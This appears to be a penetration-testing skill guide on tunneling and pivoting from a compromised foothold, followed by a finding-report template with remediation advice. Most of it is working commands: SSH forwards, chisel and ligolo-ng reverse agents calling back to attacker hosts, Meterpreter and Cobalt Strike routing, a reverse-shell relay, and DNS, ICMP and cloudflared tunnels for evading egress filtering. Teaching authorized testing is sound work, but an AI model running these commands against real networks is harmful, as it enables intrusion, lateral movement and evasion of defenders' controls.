---
name: performing-network-tunneling-and-pivoting
description: Establishing tunnels, port forwards, and SOCKS proxies to reach internal networks from a foothold during authorized engagements - covering SSH local/remote/dynamic forwarding, proxychains, chisel, ligolo-ng, socat, plink, sshuttle, Meterpreter/Cobalt Strike routing, and covert DNS/ICMP/cloud tunnels.
domain: cybersecurity
subdomain: penetration-testing
tags:
- penetration-testing
- tunneling
- pivoting
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Performing Network Tunneling and Pivoting

## When to Use
- You have a foothold (shell, session, or creds) on a host that can reach an internal subnet you cannot reach directly from the attack box.
- A target service (RDP `3389`, WinRM `5985`, SMB `445`, SQL `1433`, web) is only reachable from the compromised host or through a DMZ.
- Egress is restricted: only outbound `443`/HTTPS or DNS is allowed, so you need a covert tunnel (cloudflared, ngrok, dnscat2, iodine, ptunnel-ng).
- You need to route a whole scanning toolchain (nmap, netexec, evil-winrm) through one pivot.

## Critical: Techniques Most Often Missed
- **SOCKS over SSH (`-D`) + proxychains for the whole toolkit** — the highest-leverage pivot, frequently skipped in favor of single port forwards.
  ```bash
  ssh -f -N -D 1080 user@<compromised_ip>     # dynamic SOCKS proxy on local 1080
  echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
  proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
  ```
  - How to CONFIRM: `proxychains curl -s http://<internal_ip>` returns data, and `ss -tlnp | grep 1080` shows the local listener.
- **`-Pn -sT` is mandatory through SOCKS** — ICMP and SYN scans cannot be tunneled through a SOCKS proxy, so ping discovery and raw SYN scans silently fail or lie.
  - How to CONFIRM: a `-sT` scan returns open ports where a default `nmap` returned "host down".
- **GatewayPorts for remote forwards** — `ssh -R` only binds to loopback on the victim unless `GatewayPorts yes` is set in `/etc/ssh/sshd_config`, so reverse shells to an internal IP fail.
  ```bash
  ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@<dmz_host> -vN
  # send a rev shell to dmz_internal_ip:443, catch it on localhost:7000
  ```
  - How to CONFIRM: `ss -tlnp` on the victim shows `443` bound to the internal interface, not just `127.0.0.1`.
- **Terrapin (CVE-2023-48795)** — an MITM can inject data into any forwarded channel (`-L`/`-R`/`-D`). Confirm both ends run OpenSSH >= 9.6 before trusting an SSH tunnel.
- **Proxychains DNS leak / wrong resolver** — proxychains tunnels `gethostbyname` through SOCKS but defaults to the hardcoded resolver `4.2.2.2`. In an internal env, set the DC as the resolver (edit `/usr/lib/proxychains3/proxyresolv`) so internal names resolve.

## Workflow

### Step 1: Map reachability and pick a transport
```bash
# From the foothold, find what the pivot host can reach
for p in 445 3389 5985 1433 22; do (echo > /dev/tcp/10.10.17.25/$p) >/dev/null 2>&1 && echo "$p open"; done
# Decide: SSH available -> use -L/-R/-D ; no SSH -> drop chisel/ligolo agent ; egress filtered -> covert tunnel
```

### Step 2: SSH port forwarding (local, remote, dynamic)
```bash
# LOCAL forward: attacker_port -> compromised -> third_box:port
ssh -i ssh_key user@<compromised_ip> -L <attacker_port>:<victim_ip>:<remote_port> -N -f
sudo ssh -L 631:<victim_ip>:631 -N -f -l <user> <compromised_ip>

# REMOTE forward: open a port on the SSH server pointing back inward
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1   # local 1521 -> exposed as 10521
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1    # remote 1521 -> exposed as 10521

# DYNAMIC forward: full SOCKS proxy (use as proxychains backend)
ssh -f -N -D <attacker_port> user@<compromised_ip>

# VPN-over-SSH (root both sides, PermitTunnel/PermitRootLogin yes)
ssh root@server -w any:any
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 && ip link set tun0 up
```

### Step 3: Agent-based pivots when SSH is unavailable
```bash
# chisel reverse SOCKS (same version both ends)
./chisel server -p 8080 --reverse                       # attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks         # victim -> SOCKS on 1080
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505  # single port

# ligolo-ng (same version agent/proxy) - tun-based, no proxychains needed
sudo ./proxy -selfcert                                  # attacker
interface_create --name "ligolo"                        # attacker console
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>   # victim
session                                                 # then select agent
tunnel_start --tun "ligolo"
interface_add_route --name "ligolo" --route <network>/<netmask>

# sshuttle - route a whole subnet transparently over SSH
sshuttle -r user@host 10.10.10.0/24
sshuttle -D -r user@host 0/0 --ssh-cmd 'ssh -i ./id_rsa'

# socat relay / reverse SSL backdoor / port redirect
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678

# plink (Windows victim, reverse forward back to attacker SSH)
echo y | plink.exe -l root -pw password -R 9090:127.0.0.1:9090 10.11.0.41
```

### Step 4: C2 framework routing and Windows-native forwards
```bash
# Meterpreter local port forward
portfwd add -l <attacker_port> -p <remote_port> -r <remote_host>
# Meterpreter autoroute + SOCKS
run post/multi/manage/autoroute SUBNET=10.1.13.0
use auxiliary/server/socks_proxy; set VERSION 4a; run     # SOCKS on 1080
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf

# Cobalt Strike beacon SOCKS / reverse port forward
beacon> socks 1080
beacon> rportfwd [bind port] [forward host] [forward port]

# Windows netsh portproxy (needs local admin)
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
netsh interface portproxy show v4tov4
```

## Key Concepts
| Concept | Description |
|---------|-------------|
| **Local forward (`-L`)** | Bind a port on the attacker that tunnels to a target reachable from the pivot. |
| **Remote forward (`-R`)** | Bind a port on the pivot/SSH server that tunnels back to the attacker or inward; needs `GatewayPorts yes` for non-loopback binds. |
| **Dynamic forward (`-D`)** | Turns the SSH session into a SOCKS proxy so any tool can reach the whole reachable network via proxychains. |
| **SOCKS limitation** | ICMP/SYN cannot traverse SOCKS; always scan with `-Pn -sT`. |
| **Reverse vs forward agent** | Reverse pivots (chisel `R:socks`, ligolo agent) start from the victim and beat inbound firewall rules. |
| **tun-based pivot** | ligolo-ng / SSH `-w` create routed interfaces, avoiding per-port forwarding and proxychains. |
| **Covert channel** | DNS (dnscat2/iodine), ICMP (hans/ptunnel-ng), or HTTPS edge (cloudflared/ngrok) for restricted egress. |
| **Terrapin (CVE-2023-48795)** | SSH handshake downgrade enabling injection into forwarded channels; patch to OpenSSH >= 9.6. |

## Tools & Systems
| Tool | Purpose |
|------|---------|
| **ssh / sshuttle** | Local/remote/dynamic forwarding, VPN-over-SSH, transparent subnet routing. |
| **proxychains** | Force arbitrary TCP tools through a SOCKS proxy; tunnels DNS via `gethostbyname`. |
| **chisel** | HTTP-based reverse/forward TCP & SOCKS tunnel (match client/server version). |
| **ligolo-ng** | TUN-interface reverse tunnel with routes and listeners; no proxychains. |
| **socat** | TCP/SSL relays, reverse shells, SOCKS redirects, proxy bypass. |
| **plink.exe / netsh** | Windows SSH client reverse forwards; native `portproxy` (needs admin). |
| **Meterpreter / Cobalt Strike** | `portfwd`, `autoroute`, `socks_proxy`, beacon `socks`/`rportfwd`. |
| **cloudflared / ngrok / frp** | Outbound-443 tunnels to bypass ingress ACLs/NAT. |
| **dnscat2 / iodine / ptunnel-ng / hans** | DNS and ICMP covert tunnels for heavily filtered egress. |
| **rpivot / reGeorg** | SOCKS over NTLM proxy; SOCKS through an uploaded web tunnel (aspx/jsp/php). |

## Common Scenarios
### Scenario 1: Reach internal RDP via SSH SOCKS
A Linux foothold can reach `10.10.17.25:3389` but the attack box cannot. `ssh -f -N -D 1080 user@foothold` opens a SOCKS proxy; `proxychains xfreerdp /v:10.10.17.25` reaches RDP, and `proxychains nmap -Pn -sT` maps the rest of the subnet.

### Scenario 2: No SSH, reverse pivot with ligolo-ng
A Windows host has no SSH but can call out to the attacker. The ligolo agent connects back, the operator runs `tunnel_start` and `interface_add_route` for the internal `/24`, then tools on the attack box reach internal services directly through the routed `ligolo` interface.

### Scenario 3: HTTPS-only egress, covert exit via cloudflared
Egress allows only `443`. `cloudflared tunnel --url socks5://localhost:1080 --socks5` exposes an outbound SOCKS proxy through Cloudflare's edge, and proxychains routes traffic out without any inbound firewall change.

## Output Format
```
## Tunneling / Pivoting Finding

**Technique**: SSH dynamic forward (SOCKS) pivot
**Pivot host**: 10.10.14.8 (compromised foothold, user: svc-app)
**Reached network**: 10.10.17.0/24 (previously unreachable from attack box)
**Severity**: High
**Finding**: Foothold permits unrestricted lateral access to the internal server segment
**Evidence**:
  - `ssh -f -N -D 1080 svc-app@10.10.14.8` -> SOCKS listener on 127.0.0.1:1080
  - `proxychains nmap -Pn -sT -p445,3389,5985 10.10.17.25` -> 445,3389,5985 open
  - `proxychains evil-winrm -i 10.10.17.25 -u admin` -> shell on internal host
**Impact**: A single compromised host bridges the perimeter into the protected server VLAN, enabling lateral movement to domain infrastructure.
**Recommendation**:
  1. Enforce egress filtering and host-based firewall rules limiting outbound/lateral connections from the foothold.
  2. Segment and ACL the internal VLAN; restrict management ports (3389/5985/445) to jump hosts.
  3. Patch SSH to OpenSSH >= 9.6 (Terrapin) and disable unused forwarding (`AllowTcpForwarding no`, `GatewayPorts no`).
  4. Monitor for SOCKS/long-lived SSH sessions and anomalous DNS/ICMP volume indicating covert tunnels.
```
